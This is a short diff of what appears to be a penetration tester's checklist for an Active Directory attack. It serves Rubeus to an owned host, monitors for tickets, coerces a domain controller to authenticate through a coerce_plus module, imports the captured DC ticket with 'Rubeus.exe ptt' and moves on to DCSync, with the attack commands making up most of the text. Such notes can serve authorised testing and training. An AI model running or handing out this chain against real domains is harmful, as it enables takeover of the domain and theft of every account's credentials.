@@ -17,7 +17,7 @@ serve
 serve files rubeus
 - [ ] Rubeus.exe fetched on the host I own with the line serve files gives
 .\Rubeus.exe monitor /interval:5 /nowrap
-- [ ] Coerce a DC to authenticate to that host: :Pb responder, the coerce_plus module, with LISTENER=<Hostname>.<Domain>, not <LHOST>
+- [ ] Coerce a DC to authenticate to that host: :Pb responder, the coerce_plus module, with LISTENER=<Hostname>.<Domain>, the host I own, not Kali's address
 .\Rubeus.exe ptt /ticket:THE-BASE64
 - [ ] The DC's TGT loaded: DCSync is next, :Pb dcsync
 
